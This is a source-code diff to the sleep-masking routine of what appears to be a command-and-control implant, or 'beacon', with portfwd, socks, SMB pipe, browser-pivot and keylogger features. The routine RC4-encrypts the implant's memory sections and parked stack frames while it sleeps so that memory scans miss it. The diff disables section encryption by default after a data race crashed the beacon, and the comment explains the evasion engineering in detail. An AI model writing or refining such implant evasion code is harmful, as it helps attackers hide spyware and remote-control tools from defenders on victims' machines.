@@ -242,7 +242,31 @@ inline __attribute__((noinline)) void ekko_sleep_masked(DWORD sleepMs) {
     rc4_stk.init(key, sizeof(key));
 
     // 5. MASK: RW sections of the module + the parked caller frames.
-    if (hModule)
+    //
+    // RW-SECTION ENCRYPTION IS OFF BY DEFAULT (2026-10-19). Live evidence:
+    // with the shipped build a TCP client connecting to a `portfwd` listener
+    // killed the whole beacon at the exact instant the forward thread called
+    // std::thread() for the per-connection relay; a build with anti disabled
+    // survived the same test. The cause is a data race that cannot be made
+    // safe by construction: the sleeping thread RC4-encrypts the module's
+    // writable sections (.data/.bss), while background threads (portfwd,
+    // socks, SMB pipe, browser pivot, keylogger, task workers) keep calling
+    // into the statically-linked CRT whose globals live in those very
+    // sections. Thread creation is the most reliable trigger (malloc/TLS/
+    // errno), but any CRT call is exposed. Encrypting code or data behind
+    // other live threads is a use-after-encryption bug, not a hardening
+    // trade-off. Stack masking of the PARKED caller frames stays on: no other
+    // thread ever touches that stack, so it is race-free.
+    //
+    // Build with -DPHANTOM_SLEEP_SECTION_MASK to restore section encryption
+    // for a strictly single-threaded deployment (no background features,
+    // no task workers). Never enable it in a feature-complete build.
+#ifdef PHANTOM_SLEEP_SECTION_MASK
+    const bool mask_sections = (hModule != nullptr);
+#else
+    const bool mask_sections = false;
+#endif
+    if (mask_sections)
         encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
     if (stkLen)
         rc4_stk.crypt(stkLo, stkLen);
@@ -290,7 +314,7 @@ inline __attribute__((noinline)) void ekko_sleep_masked(DWORD sleepMs) {
     //    sections and the live stack instead of restoring them.
     rc4_sec.init(key, sizeof(key));
     rc4_stk.init(key, sizeof(key));
-    if (hModule)
+    if (mask_sections)
         encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
     if (stkLen)
         rc4_stk.crypt(stkLo, stkLen);
